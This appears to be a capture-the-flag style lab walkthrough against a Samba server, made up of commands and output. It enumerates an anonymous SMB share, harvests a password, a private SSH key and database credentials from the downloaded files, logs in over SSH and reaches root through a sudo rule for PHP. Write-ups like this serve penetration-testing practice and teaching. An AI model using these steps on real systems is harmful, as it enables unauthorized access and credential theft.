Initial Recon
```# Nmap shows port 445 open
nmap -sC -sV -p 445 10.10.10.10
# 445/tcp open  microsoft-ds?

# Test anonymous access
smbclient -N -L //10.10.10.10
# Sharename       Type      Comment
# ---------       ----      -------
# share           Disk      Company Share
# IPC$            IPC       IPC Service
```

### Step-by-Step Exploitation
Enumerate The Share
```# Connect to share
smbclient -N //10.10.10.10/share

# List contents
smb: \> ls
  .                                   D        0  Tue Oct 10 10:00:00 2023
  ..                                  D        0  Tue Oct 10 10:00:00 2023
  backup.zip                          N    10240  Tue Oct 10 09:00:00 2023
  notes.txt                           N      512  Tue Oct 10 08:00:00 2023
  scripts                            DR        0  Tue Oct 10 07:00:00 2023

# Download everything
smb: \> prompt OFF
smb: \> mget *
```

#### Analyze Downloaded Files
```# Check notes.txt
cat notes.txt
# TODO: Move backup.zip to secure location
# Password for backup: P@ssw0rd!2023

# Check backup.zip
unzip backup.zip
# Archive:  backup.zip
#   inflating: id_rsa
#   inflating: config.php

# Check id_rsa
cat id_rsa
# -----BEGIN RSA PRIVATE KEY-----
# MIIEowIBAAKCAQEAvx...
# -----END RSA PRIVATE KEY-----

# Check config.php
cat config.php
# <?php
# $db_user = "website_user";
# $db_pass = "MySecureDBPass123!";
# ?>
```

#### Try SSH Access
```# Save private key
chmod 600 id_rsa

# Try SSH with key
ssh -i id_rsa website_user@10.10.10.10
# Welcome to Ubuntu 20.04 LTS!
# website_user@target:~$

# Check sudo rights
sudo -l
# User website_user may run the following commands on target:
#     (ALL : ALL) NOPASSWD: /usr/bin/php

# Exploit PHP sudo
sudo php -r "system('/bin/bash');"

# Now root!
whoami
# root
```

